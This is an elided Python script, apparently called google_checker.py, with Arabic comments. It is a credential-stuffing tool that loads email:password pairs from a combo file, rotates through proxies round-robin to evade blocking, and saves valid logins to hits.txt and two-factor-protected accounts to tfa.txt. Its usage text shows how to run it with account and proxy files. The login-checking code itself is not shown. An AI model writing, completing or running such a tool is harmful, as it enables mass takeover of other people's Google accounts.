...
def load_proxies(proxy_file):
    ...
    try:
        ...
        print(f"⚠️ ملف البروكسيات '{proxy_file}' غير موجود")
        return []


def get_next_proxy(proxies, index):
    """جلب البروكسي التالي بشكل دائري (Round-Robin)"""
    if not proxies:
        return None
...
def check_file(path, proxy_file=None):
    ...
    if total_proxies > 0:
        print(f"✅ تم تحميل {total_proxies} بروكسي")

    with open(path, encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if ":" in l.strip() and not l.startswith("#")]

    print(f"\n📊 {len(lines)} حساب | البروكسيات: {proxy_file or 'بدون بروكسي'}\n" + "─" * 60)
    ...
    for idx, line in enumerate(lines):
        ...
        # اختيار بروكسي من القائمة بشكل دائري
        proxy = get_next_proxy(proxies, idx) if proxies else None
    ...
    if hits:
        print(f"\n  ✅ hits.txt تم حفظ {len(hits)} حساب")
    if tfa:
        print(f"  🔒 tfa.txt تم حفظ {len(tfa)} حساب")
...
def usage():
    print(
        ...
        "  python3 google_checker.py accounts.txt proxy.txt\n\n"
        "📝 صيغة البروكسي:\n"
        "  IP:PORT\n"
        "  user:pass@IP:PORT\n"
...
if __name__ == "__main__":
    ...
    # إذا كان الوسيط الأول ملف حسابات
    if os.path.isfile(args[0]):
        proxy_file = args[1] if len(args) > 1 and os.path.isfile(args[1]) else None
        check_file(args[0], proxy_file)
    # إذا كان وسيطين (ايميل وباسورد)
    elif len(args) >= 2:
        email = args[0]
        password = args[1]
